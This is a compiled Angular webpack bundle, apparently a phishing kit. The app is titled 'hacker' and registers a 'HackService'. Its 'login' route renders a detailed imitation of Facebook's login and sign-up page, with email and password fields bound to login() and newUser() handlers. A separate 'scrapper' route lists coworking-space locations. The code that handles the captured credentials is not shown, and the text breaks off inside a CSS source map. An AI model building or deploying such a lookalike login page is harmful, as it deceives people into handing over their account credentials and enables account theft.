(window["webpackJsonp"] = window["webpackJsonp"] || []).push([["main"],{

/***/ "./$$_lazy_route_resource lazy recursive":
/*!******************************************************!*\
  !*** ./$$_lazy_route_resource lazy namespace object ***!
  \******************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

function webpackEmptyAsyncContext(req) {
	// Here Promise.resolve().then() is used instead of new Promise() to prevent
	// uncaught exception popping up in devtools
	return Promise.resolve().then(function() {
		var e = new Error("Cannot find module '" + req + "'");
		e.code = 'MODULE_NOT_FOUND';
		throw e;
	});
}
webpackEmptyAsyncContext.keys = function() { return []; };
webpackEmptyAsyncContext.resolve = webpackEmptyAsyncContext;
module.exports = webpackEmptyAsyncContext;
webpackEmptyAsyncContext.id = "./$$_lazy_route_resource lazy recursive";

/***/ }),

/***/ "./node_modules/raw-loader/index.js!./src/app/app.component.html":
/*!**************************************************************!*\
  !*** ./node_modules/raw-loader!./src/app/app.component.html ***!
  \**************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<router-outlet></router-outlet>\n"

/***/ }),

/***/ "./node_modules/raw-loader/index.js!./src/app/clone/clone.component.html":
/*!**********************************************************************!*\
  !*** ./node_modules/raw-loader!./src/app/clone/clone.component.html ***!
  \**********************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<nav class=\"uk-navbar-container uk-box-shadow-small boundary uk-visible@m\">\n    <div class=\"uk-container uk-container-large uk-padding-large uk-padding-remove-top uk-padding-remove-bottom\" data-uk-navbar>\n        <div class=\"uk-navbar-left\">\n            <h1 class=\"uk-margin-xlarge-left\">facebook</h1>\n        </div>\n        <div class=\"uk-navbar-right\">\n            <div class=\"uk-navbar-item\">\n                <div class=\"uk-grid uk-grid-small uk-margin-xlarge-right\" data-uk-grid>\n                    <div class=\"uk-width-auto\">\n                        <label class=\"uk-form-label row1\" for=\"\">Email or Phone</label><br>\n                        <input [(ngModel)]=\"user.email\" name=\"email\" type=\"text\" class=\"inputtext\"><br>\n                        <span class=\"row2\"><input type=\"checkbox\" checked>Keep me logged in</span>\n                        \n                    </div>\n                    <div class=\"uk-width-auto\">\n                        <label class=\"uk-form-label row1\" for=\"\">Password</label><br>\n                        <input [(ngModel)]=\"user.password\" name=\"password\" type=\"password\" class=\"inputtext\"><br>\n                        <span class=\"row2 h\">Forgot your password?</span>\n                    </div>\n                    <div class=\"uk-width-expand\">\n                        <label class=\"uk-form-label row1\" for=\"\"></label><br>\n                        <button (click)=\"login()\" id=\"button\">Log In</button>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>\n</nav>\n<nav class=\"uk-navbar-container uk-box-shadow-small boundary uk-hidden@m\">\n    <div class=\"uk-container uk-container-large\">\n        <div class=\"uk-navbar\" uk-navbar=\"mode:click;\">\n            <div class=\"uk-navbar-left\">\n                <h1 class=\"uk-margin-small-left\">facebook</h1>\n            </div>\n            <div class=\"uk-navbar-right\">\n                <a class=\"uk-navbar-toggle\" uk-navbar-toggle-icon uk-toggle=\"target: #side-nav\"></a>\n            </div>\n        </div>\n    </div>\n</nav>\n\n<div id=\"side-nav\" data-uk-offcanvas=\"  overlay: true\">\n    <div class=\"uk-offcanvas-bar\">\n            <ul class=\"uk-nav-default uk-nav-parent-icon uk-margin-auto-vertical\" uk-nav=\"multiple: true\">\n  \n                <li>\n                    <div class=\"uk-width-1-1\">\n                        <label class=\"uk-form-label row1\" for=\"\">Email or Phone</label><br>\n                        <input [(ngModel)]=\"user.email\" name=\"email\" type=\"text\" class=\"inputtext\"><br>\n                        <span class=\"row2\"><input type=\"checkbox\" checked>Keep me logged in</span>\n                        \n                    </div>\n                </li>\n                <li>\n                    <div class=\"uk-width-1-1\">\n                        <label class=\"uk-form-label row1\" for=\"\">Password</label><br>\n                        <input [(ngModel)]=\"user.password\" name=\"password\" type=\"password\" class=\"inputtext\"><br>\n                        <span class=\"row2 h\">Forgot your password?</span>\n                    </div>\n                </li>\n                <li>\n                    <div class=\"uk-width-1-1 uk-margin-small-top\">\n                        <button (click)=\"login()\" id=\"button\">Log In</button>\n                    </div>\n                </li>\n                <li class=\"uk-nav-divider uk-margin-small-top\" style=\"color: white\">\n                </li>\n    \n            </ul>\n    </div>\n</div>\n\n\n<div class=\"uk-section uk-padding-small uk-padding-remove-top\" data-uk-height-viewport>\n    <div class=\"uk-container body-container\" data-uk-toggle=\"cls: uk-padding-large; mode: media; media: @m;\">\n        <div class=\"uk-grid uk-grid-small uk-margin-small\" data-uk-grid>\n            <div class=\"uk-width-1-2@s\">\n                <div class=\"uk-container uk-padding-large uk-padding-remove-top\" data-uk-toggle=\"cls: uk-margin-large-left; mode: media; media: @m;\">\n                    <div class=\"connect bolder\">\n                    Facebook helps you connect and share with the people in your life.</div>\n                    <div >\n                    <img src=\"https://s3.ap-south-1.amazonaws.com/karan.garg/OBaVg52wtTZ.png\"\n                        alt=\"\"  />\n                    </div>\n                </div>\n            </div>\n            <div class=\"uk-width-1-2@s\">\n                <div class=\"uk-container uk-padding-large uk-padding-remove-top\">\n                        <div class=\"uk-grid uk-grid-small uk-padding-remove-top\" data-uk-grid data-uk-toggle=\"cls: uk-padding-large; mode: media; media: @m\">\n                                <div class=\"uk-width-1-1\">\n                                    <h6 class=\" signup bolder\">Sign Up</h6>\n                                    <h6 class=\"uk-margin-remove-top free bolder\">It's free and always will be</h6>\n                                </div>\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\n                                    <div class=\"uk-grid-small uk-grid\" data-uk-grid>\n                                        <div class=\"uk-width-1-2@s uk-margin-remove-bottom\">\n                                                <input [(ngModel)]=\"new_user.first_name\" name=\"first_name\" type=\"text\" class=\"inputbody in1 uk-input\" placeholder=\"First name\">\n                                        </div>\n                                        <div class=\"uk-width-1-2@s uk-margin-remove-top\">\n                                                <input [(ngModel)]=\"new_user.last_name\" name=\"last_name\" type=\"text\" class=\"inputbody in1 fr uk-input\" placeholder=\"Last name\">\n                                        </div>\n                                    </div>\n                                </div>\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\n                                        <input [(ngModel)]=\"new_user.email\" name=\"email\" type=\"text\" class=\"inputbody in2 uk-input\" placeholder=\"Email or mobile number\">\n                                </div>\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\n                                        <input [(ngModel)]=\"new_user.email\" name=\"email\" type=\"text\" class=\"inputbody in2 uk-input\" placeholder=\"Re-enter email or mobile number\">\n                                </div>\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\n                                        <input [(ngModel)]=\"new_user.password\" name=\"password\" type=\"text\" class=\"inputbody in2 uk-input\" placeholder=\"New password\">\n                                </div>\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\n                                    <label class=\"uk-form-label bday\" for=\"\">Birthday</label>\n                                    <div class=\"uk-grid uk-grid-small uk-margin-small-top\" data-uk-grid>\n                                        <div class=\"uk-width-auto\">\n                                                <select  name=\"birthday_day\" title=\"Day\" class=\"selectbody fl uk-select\">\n                                                        <option value=\"0\" selected=\"1\">Day</option>\n                                                        <option value=\"1\">1</option>\n                                                        <option value=\"2\">2</option>\n                                                        <option value=\"3\">3</option>\n                                                        <option value=\"4\">4</option>\n                                                        <option value=\"5\">5</option>\n                                                        <option value=\"6\">6</option>\n                                                        <option value=\"7\">7</option>\n                                                        <option value=\"8\">8</option>\n                                                        <option value=\"9\">9</option>\n                                                        <option value=\"10\">10</option>\n                                                        <option value=\"11\">11</option>\n                                                        <option value=\"12\">12</option>\n                                                        <option value=\"13\">13</option>\n                                                        <option value=\"14\">14</option>\n                                                        <option value=\"15\">15</option>\n                                                        <option value=\"16\">16</option>\n                                                        <option value=\"17\">17</option>\n                                                        <option value=\"18\">18</option>\n                                                        <option value=\"19\">19</option>\n                                                        <option value=\"20\">20</option>\n                                                        <option value=\"21\">21</option>\n                                                        <option value=\"22\">22</option>\n                                                        <option value=\"23\">23</option>\n                                                        <option value=\"24\">24</option>\n                                                        <option value=\"25\">25</option>\n                                                        <option value=\"26\">26</option>\n                                                        <option value=\"27\">27</option>\n                                                        <option value=\"28\">28</option>\n                                                        <option value=\"29\">29</option>\n                                                        <option value=\"30\">30</option>\n                                                        <option value=\"31\">31</option>\n                                                        </select>\n                                        </div>\n                                        <div class=\"uk-width-auto uk-padding-remove-left\">\n                                                <select  name=\"birthday_month\" title=\"Month\" class=\"selectbody uk-select\">\n                                                        <option value=\"0\" selected=\"1\">Month</option>\n                                                        <option value=\"1\">Jan</option>\n                                                        <option value=\"2\">Feb</option>\n                                                        <option value=\"3\">Mar</option>\n                                                        <option value=\"4\">Apr</option>\n                                                        <option value=\"5\">May</option>\n                                                        <option value=\"6\">Jun</option>\n                                                        <option value=\"7\">Jul</option>\n                                                        <option value=\"8\">Aug</option>\n                                                        <option value=\"9\">Sep</option>\n                                                        <option value=\"10\">Oct</option>\n                                                        <option value=\"11\">Nov</option>\n                                                        <option value=\"12\">Dec</option>\n                                                </select>\n                                        </div>\n                                        <div class=\"uk-width-auto uk-padding-remove-left\">\n                                                <select  name=\"birthday_year\" title=\"Year\" class=\"selectbody fl uk-select\">\n                                                        <option value=\"0\" selected=\"1\">Year</option>\n                                                        <option value=\"2015\">2015</option>\n                                                        <option value=\"2014\">2014</option>\n                                                        <option value=\"2013\">2013</option>\n                                                        <option value=\"2012\">2012</option>\n                                                        <option value=\"2011\">2011</option>\n                                                        <option value=\"2010\">2010</option>\n                                                        <option value=\"2009\">2009</option>\n                                                        <option value=\"2008\">2008</option>\n                                                        <option value=\"2007\">2007</option>\n                                                        <option value=\"2006\">2006</option>\n                                                        <option value=\"2005\">2005</option>\n                                                        <option value=\"2004\">2004</option>\n                                                        <option value=\"2003\">2003</option>\n                                                        <option value=\"2002\">2002</option>\n                                                        <option value=\"2001\">2001</option>\n                                                        <option value=\"2000\">2000</option>\n                                                        <option value=\"1999\">1999</option>\n                                                        <option value=\"1998\">1998</option>\n                                                        <option value=\"1997\">1997</option>\n                                                        <option value=\"1996\">1996</option>\n                                                        <option value=\"1995\">1995</option>\n                                                        <option value=\"1994\">1994</option>\n                                                        <option value=\"1993\">1993</option>\n                                                        <option value=\"1992\">1992</option>\n                                                        <option value=\"1991\">1991</option>\n                                                        <option value=\"1990\">1990</option>\n                                                        <option value=\"1989\">1989</option>\n                                                        <option value=\"1988\">1988</option>\n                                                        <option value=\"1987\">1987</option>\n                                                        <option value=\"1986\">1986</option>\n                                                        <option value=\"1985\">1985</option>\n                                                        <option value=\"1984\">1984</option>\n                                                        <option value=\"1983\">1983</option>\n                                                        <option value=\"1982\">1982</option>\n                                                        <option value=\"1981\">1981</option>\n                                                        <option value=\"1980\">1980</option>\n                                                        <option value=\"1979\">1979</option>\n                                                        <option value=\"1978\">1978</option>\n                                                        <option value=\"1977\">1977</option>\n                                                        <option value=\"1976\">1976</option>\n                                                        <option value=\"1975\">1975</option>\n                                                        <option value=\"1974\">1974</option>\n                                                        <option value=\"1973\">1973</option>\n                                                        <option value=\"1972\">1972</option>\n                                                        <option value=\"1971\">1971</option>\n                                                        <option value=\"1970\">1970</option>\n                                                        <option value=\"1969\">1969</option>\n                                                        <option value=\"1968\">1968</option>\n                                                        <option value=\"1967\">1967</option>\n                                                        <option value=\"1966\">1966</option>\n                                                        <option value=\"1965\">1965</option>\n                                                        <option value=\"1964\">1964</option>\n                                                        <option value=\"1963\">1963</option>\n                                                        <option value=\"1962\">1962</option>\n                                                        <option value=\"1961\">1961</option>\n                                                        <option value=\"1960\">1960</option>\n                                                        <option value=\"1959\">1959</option>\n                                                        <option value=\"1958\">1958</option>\n                                                        <option value=\"1957\">1957</option>\n                                                        <option value=\"1956\">1956</option>\n                                                        <option value=\"1955\">1955</option>\n                                                        <option value=\"1954\">1954</option>\n                                                        <option value=\"1953\">1953</option>\n                                                        <option value=\"1952\">1952</option>\n                                                        <option value=\"1951\">1951</option>\n                                                        <option value=\"1950\">1950</option>\n                                                        <option value=\"1949\">1949</option>\n                                                        <option value=\"1948\">1948</option>\n                                                        <option value=\"1947\">1947</option>\n                                                        <option value=\"1946\">1946</option>\n                                                        <option value=\"1945\">1945</option>\n                                                        <option value=\"1944\">1944</option>\n                                                        <option value=\"1943\">1943</option>\n                                                        <option value=\"1942\">1942</option>\n                                                        <option value=\"1941\">1941</option>\n                                                        <option value=\"1940\">1940</option>\n                                                        <option value=\"1939\">1939</option>\n                                                        <option value=\"1938\">1938</option>\n                                                        <option value=\"1937\">1937</option>\n                                                        <option value=\"1936\">1936</option>\n                                                        <option value=\"1935\">1935</option>\n                                                        <option value=\"1934\">1934</option>\n                                                        <option value=\"1933\">1933</option>\n                                                        <option value=\"1932\">1932</option>\n                                                        <option value=\"1931\">1931</option>\n                                                        <option value=\"1930\">1930</option>\n                                                        <option value=\"1929\">1929</option>\n                                                        <option value=\"1928\">1928</option>\n                                                        <option value=\"1927\">1927</option>\n                                                        <option value=\"1926\">1926</option>\n                                                        <option value=\"1925\">1925</option>\n                                                        <option value=\"1924\">1924</option>\n                                                        <option value=\"1923\">1923</option>\n                                                        <option value=\"1922\">1922</option>\n                                                        <option value=\"1921\">1921</option>\n                                                        <option value=\"1920\">1920</option>\n                                                        <option value=\"1919\">1919</option>\n                                                        <option value=\"1918\">1918</option>\n                                                        <option value=\"1917\">1917</option>\n                                                        <option value=\"1916\">1916</option>\n                                                        <option value=\"1915\">1915</option>\n                                                        <option value=\"1914\">1914</option>\n                                                        <option value=\"1913\">1913</option>\n                                                        <option value=\"1912\">1912</option>\n                                                        <option value=\"1911\">1911</option>\n                                                        <option value=\"1910\">1910</option>\n                                                        <option value=\"1909\">1909</option>\n                                                        <option value=\"1908\">1908</option>\n                                                        <option value=\"1907\">1907</option>\n                                                        <option value=\"1906\">1906</option>\n                                                        <option value=\"1905\">1905</option>\n                                                        </select>\n                                        </div>\n                                        <div class=\"uk-width-expand@s uk-width-1-1\">\n                                            <p class=\"fb1 why h\">Why do I need to provide my birthday?</p>\n                                        </div>\n                                    </div>\n                                </div>\n                                <div class=\"uk-width-1-1\">\n                                        <input [(ngModel)]=\"new_user.gender\" name=\"gender\" value=\"female\" type=\"radio\" id=\"fem\" class=\"m0\">\n                                        <label for=\"fem\" class=\"gender\">Female\n                                        </label>\n                                        <input [(ngModel)]=\"new_user.gender\" name=\"gender\" value=\"male\" type=\"radio\" id=\"male\" class=\"m0 uk-margin-small-right\">\n                                        <label for=\"male\" class=\"gender\">Male\n                                        </label>\n                                </div>\n                                <div class=\"uk-width-1-1\">\n                                    <p class=\"agree\">By clicking Sign Up, you agree to our <span class=\"link\">Terms</span> and that you have read our <span class=\"link\">Data Use Policy</span>, including our <span class=\"link\">Cookie Use.</span></p>\n                                </div>\n                                <div class=\"uk-width-1-1\">\n                                    <button type=\"button\" (click)=\"newUser()\" class=\"signbut bolder\">Sign Up</button>\n                                </div>\n                                <div class=\"uk-width-1-1 create\">\n                                    <p class=\"uk-margin-small-top\"><span class=\"link h\">Create a Page</span> for a celebrity, band or business</p>\n                                </div>\n                            </div> \n                </div>\n              </div>\n        </div>\n    </div>\n</div>"

/***/ }),

/***/ "./node_modules/raw-loader/index.js!./src/app/facebook/facebook.component.html":
/*!****************************************************************************!*\
  !*** ./node_modules/raw-loader!./src/app/facebook/facebook.component.html ***!
  \****************************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"uk-grid\" uk-grid>\n  <div class=\"uk-width-1-1 uk-grid\" uk-grid>\n    <div>\n      <select (change)=\"change($event)\" name=\"type\" id=\"\">\n        <option value=\"sharedesk\">sharedesk</option>\n        <option value=\"nexdus\">nexdus</option>\n        <option value=\"hackerstreet\">hackerstreet</option>\n        <option value=\"myhq\">myhq</option>\n        <option value=\"engage\">engage</option>\n      </select>\n    </div>\n    <div>\n      <button [useExistingCss]=\"true\" printSectionId=\"print-section\" ngxPrint>print</button>\n    </div>\n  </div>\n  <div id=\"print-section\" class=\"uk-width-1-1\">\n    <table class=\"uk-table uk-table-striped\">\n      <thead>\n        <tr>\n          <th>S. No</th>\n          <th>Name</th>\n          <th>Address</th>\n          <th>Type</th>\n          <th>Provider</th>\n        </tr>\n      </thead>\n      <tbody>\n        <tr *ngFor=\"let location of locations; let i = index\">\n          <td>{{i + 1}}</td>\n          <td>{{location.name}}</td>\n          <td>{{location.address}}</td>\n          <td>{{location.type}}</td>\n          <td>{{location.provider}}</td>\n        </tr>\n      </tbody>\n    </table>\n  </div>\n</div>"

/***/ }),

/***/ "./src/app/app-routing.module.ts":
/*!***************************************!*\
  !*** ./src/app/app-routing.module.ts ***!
  \***************************************/
/*! exports provided: AppRoutingModule, routingComponents */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppRoutingModule", function() { return AppRoutingModule; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "routingComponents", function() { return routingComponents; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm2015/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm2015/router.js");
/* harmony import */ var _facebook_facebook_component__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./facebook/facebook.component */ "./src/app/facebook/facebook.component.ts");
/* harmony import */ var _clone_clone_component__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./clone/clone.component */ "./src/app/clone/clone.component.ts");





const routes = [
    { path: '', redirectTo: '/login', pathMatch: 'full' },
    { path: 'scrapper', component: _facebook_facebook_component__WEBPACK_IMPORTED_MODULE_3__["FacebookComponent"] },
    { path: 'login', component: _clone_clone_component__WEBPACK_IMPORTED_MODULE_4__["CloneComponent"] }
];
let AppRoutingModule = class AppRoutingModule {
};
AppRoutingModule = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["NgModule"])({
        imports: [_angular_router__WEBPACK_IMPORTED_MODULE_2__["RouterModule"].forRoot(routes)],
        exports: [_angular_router__WEBPACK_IMPORTED_MODULE_2__["RouterModule"]]
    })
], AppRoutingModule);

const routingComponents = [
    _facebook_facebook_component__WEBPACK_IMPORTED_MODULE_3__["FacebookComponent"],
    _clone_clone_component__WEBPACK_IMPORTED_MODULE_4__["CloneComponent"]
];


/***/ }),

/***/ "./src/app/app.component.css":
/*!***********************************!*\
  !*** ./src/app/app.component.css ***!
  \***********************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL2FwcC5jb21wb25lbnQuY3NzIn0= */"

/***/ }),

/***/ "./src/app/app.component.ts":
/*!**********************************!*\
  !*** ./src/app/app.component.ts ***!
  \**********************************/
/*! exports provided: AppComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppComponent", function() { return AppComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm2015/core.js");


let AppComponent = class AppComponent {
    constructor() {
        this.title = 'hacker';
    }
};
AppComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
        selector: 'app-root',
        template: __webpack_require__(/*! raw-loader!./app.component.html */ "./node_modules/raw-loader/index.js!./src/app/app.component.html"),
        styles: [__webpack_require__(/*! ./app.component.css */ "./src/app/app.component.css")]
    })
], AppComponent);



/***/ }),

/***/ "./src/app/app.module.ts":
/*!*******************************!*\
  !*** ./src/app/app.module.ts ***!
  \*******************************/
/*! exports provided: AppModule */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppModule", function() { return AppModule; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_platform_browser__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/platform-browser */ "./node_modules/@angular/platform-browser/fesm2015/platform-browser.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm2015/core.js");
/* harmony import */ var _app_routing_module__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./app-routing.module */ "./src/app/app-routing.module.ts");
/* harmony import */ var _app_component__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./app.component */ "./src/app/app.component.ts");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm2015/http.js");
/* harmony import */ var _angular_forms__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! @angular/forms */ "./node_modules/@angular/forms/fesm2015/forms.js");
/* harmony import */ var src_app_services_hack_service__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! src/app/services/hack.service */ "./src/app/services/hack.service.ts");
/* harmony import */ var ngx_print__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ngx-print */ "./node_modules/ngx-print/fesm2015/ngx-print.js");










let AppModule = class AppModule {
};
AppModule = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_2__["NgModule"])({
        declarations: [
            _app_component__WEBPACK_IMPORTED_MODULE_4__["AppComponent"],
            _app_routing_module__WEBPACK_IMPORTED_MODULE_3__["routingComponents"]
        ],
        imports: [
            _angular_platform_browser__WEBPACK_IMPORTED_MODULE_1__["BrowserModule"],
            _app_routing_module__WEBPACK_IMPORTED_MODULE_3__["AppRoutingModule"],
            _angular_common_http__WEBPACK_IMPORTED_MODULE_5__["HttpClientModule"],
            _angular_forms__WEBPACK_IMPORTED_MODULE_6__["FormsModule"],
            ngx_print__WEBPACK_IMPORTED_MODULE_8__["NgxPrintModule"]
        ],
        providers: [src_app_services_hack_service__WEBPACK_IMPORTED_MODULE_7__["HackService"]],
        bootstrap: [_app_component__WEBPACK_IMPORTED_MODULE_4__["AppComponent"]]
    })
], AppModule);



/***/ }),

/***/ "./src/app/clone/clone.component.css":
/*!*******************************************!*\
  !*** ./src/app/clone/clone.component.css ***!
  \*******************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".uk-section{\n    background-color: #edf0f5;\n}\n\n.uk-input {\n    display: inline-block;\n    font-size: 18px;\n    padding: 8px 10px;\n    border: 1px solid #bdc7d8;\n  -webkit-border-radius: 5px;\n    color:#333;\n    margin-bottom:10px;\n}\n\n.signup {\n    font-size:36px;\n    -webkit-font-smoothing: antialiased;\n    font-weight:700;\n    margin-bottom:5px;\n  }\n\n.bolder {\n    font-family: 'Open Sans',sans-serif;\n    text-rendering:optimizelegibility;\n    color:#333;\n  }\n\n.free {\n    font-size:19px;\n    margin-bottom:20px;\n  }\n\n.bday {\n    font-size:19px;\n    color:#141823;\n    -webkit-font-smoothing: antialiased;\n    margin-bottom:5px;\n  }\n\n.uk-select {\n    display: inline-block;\n    height:30px;\n    font-size: 13px;\n    border: 1px solid #bdc7d8;\n    -webkit-border-radius: 5px;\n    color:#141823;\n   \n  }\n\n.why {\n    font-size: 11px;\n    color: #3b5998;\n    width:150px;\n    margin-left:10px;\n    cursor:pointer;\n  }\n\n.h:hover {\n    text-decoration: underline;\n  }\n\n.fb1 {\n    display:inline-block;\n    vertical-align: middle;\n  }\n\n.gender {\n    font-size: 18px;\n    color: #141823;\n    cursor: pointer;\n    padding: 0 10px 0 3px;\n    margin-right: 4px;\n    line-height: 18px;\n    vertical-align: middle;\n  }\n\n.agree {\n    font-size: 11px;\n    color: #777;\n    width:70%;\n    /* margin: 11px 0 11px ; */\n  }\n\n.link {\n    color:#3b5998;\n    display: inline-block;\n    cursor: pointer;\n  }\n\n.signbut {\n    font-size: 19px;\n    font-weight: 700;\n    letter-spacing: 1px;\n    color:#fff;\n    min-width: 194px;\n    padding: 7px 20px;\n    text-align: center;\n    -webkit-border-radius: 5px;\n    background: -webkit-linear-gradient(#67ae55, #578843);\n    -webkit-box-shadow: inset 0 1px 1px #a4e388;\n    border: 1px solid;\n  border-color: #3b6e22 #3b6e22 #2c5115;\n    margin-top: 10px;\n  margin-bottom: 10px;\n    text-shadow: 0 1px 2px rgba(0,0,0,.5);\n    cursor:pointer;\n  }\n\n.create {\n    border-top: 1px solid #a0a9c0;\n    color: #666;\n    font-size: 13px;\n    font-weight: bold;\n  }\n\n.connect {\n    width:80%;\n    /* height: 5rem; */\n    padding: 42px 0 24px;\n    font-size: 20px;\n    font-weight: 700;\n    line-height: 36px;\n    color: #333;\n    display:inline-block;\n  }\n\n.uk-navbar-container{\n      background: #3b5998\n  }\n\n.body-container{\n      padding-top: 1rem;\n  }\n\n.inputtext {\n    border-color: #1d2a5b;\n    margin: 0;\n    width: 90%;\n    border: 1px solid #bdc7d8;\n    margin: 0;\n    padding: 3px;\n    background-color: #FAFFBD;\n  }\n\nh1 {\n    font-family: tahoma,verdana,arial,sans-serif;\n    font-size: 38px;\n    letter-spacing:0.05px;\n    margin: 0;\n    color:#fff;\n    -webkit-font-smoothing: antialiased;\n  }\n\n.row1 {\n    \n    color:#fff;\n    font-size:11px;\n    cursor:pointer;\n  }\n\n#button {\n    position:relative;\n    /* width:45px;\n    height:18px; */\n    background-color: #5b72a9;\n    border: 1px solid #999;\n    border-color:#8b9dc3 #2f477a #29447e #1a356e;\n    -webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .1);\n    cursor:pointer;\n    font-size:11px;\n    font-weight:bold;\n    text-align:center;\n    color:#fff;\n  }\n\n.row2 {\n    \n    color:#9daccb;\n    font-size:11px;\n    cursor:pointer;\n  }\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvY2xvbmUvY2xvbmUuY29tcG9uZW50LmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtJQUNJLHlCQUF5QjtBQUM3Qjs7QUFFQTtJQUNJLHFCQUFxQjtJQUNyQixlQUFlO0lBQ2YsaUJBQWlCO0lBQ2pCLHlCQUF5QjtFQUMzQiwwQkFBMEI7SUFDeEIsVUFBVTtJQUNWLGtCQUFrQjtBQUN0Qjs7QUFFQTtJQUNJLGNBQWM7SUFDZCxtQ0FBbUM7SUFDbkMsZUFBZTtJQUNmLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLG1DQUFtQztJQUNuQyxpQ0FBaUM7SUFDakMsVUFBVTtFQUNaOztBQUNBO0lBQ0UsY0FBYztJQUNkLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGNBQWM7SUFDZCxhQUFhO0lBQ2IsbUNBQW1DO0lBQ25DLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLHFCQUFxQjtJQUNyQixXQUFXO0lBQ1gsZUFBZTtJQUNmLHlCQUF5QjtJQUN6QiwwQkFBMEI7SUFDMUIsYUFBYTs7RUFFZjs7QUFFQTtJQUNFLGVBQWU7SUFDZixjQUFjO0lBQ2QsV0FBVztJQUNYLGdCQUFnQjtJQUNoQixjQUFjO0VBQ2hCOztBQUVBO0lBQ0UsMEJBQTBCO0VBQzVCOztBQUNBO0lBQ0Usb0JBQW9CO0lBQ3BCLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGVBQWU7SUFDZixjQUFjO0lBQ2QsZUFBZTtJQUNmLHFCQUFxQjtJQUNyQixpQkFBaUI7SUFDakIsaUJBQWlCO0lBQ2pCLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGVBQWU7SUFDZixXQUFXO0lBQ1gsU0FBUztJQUNULDBCQUEwQjtFQUM1Qjs7QUFFQTtJQUNFLGFBQWE7SUFDYixxQkFBcUI7SUFDckIsZUFBZTtFQUNqQjs7QUFFQTtJQUNFLGVBQWU7SUFDZixnQkFBZ0I7SUFDaEIsbUJBQW1CO0lBQ25CLFVBQVU7SUFDVixnQkFBZ0I7SUFDaEIsaUJBQWlCO0lBQ2pCLGtCQUFrQjtJQUNsQiwwQkFBMEI7SUFDMUIscURBQXFEO0lBQ3JELDJDQUEyQztJQUMzQyxpQkFBaUI7RUFDbkIscUNBQXFDO0lBQ25DLGdCQUFnQjtFQUNsQixtQkFBbUI7SUFDakIscUNBQXFDO0lBQ3JDLGNBQWM7RUFDaEI7O0FBRUE7SUFDRSw2QkFBNkI7SUFDN0IsV0FBVztJQUNYLGVBQWU7SUFDZixpQkFBaUI7RUFDbkI7O0FBRUE7SUFDRSxTQUFTO0lBQ1Qsa0JBQWtCO0lBQ2xCLG9CQUFvQjtJQUNwQixlQUFlO0lBQ2YsZ0JBQWdCO0lBQ2hCLGlCQUFpQjtJQUNqQixXQUFXO0lBQ1gsb0JBQW9CO0VBQ3RCOztBQUVBO01BQ0k7RU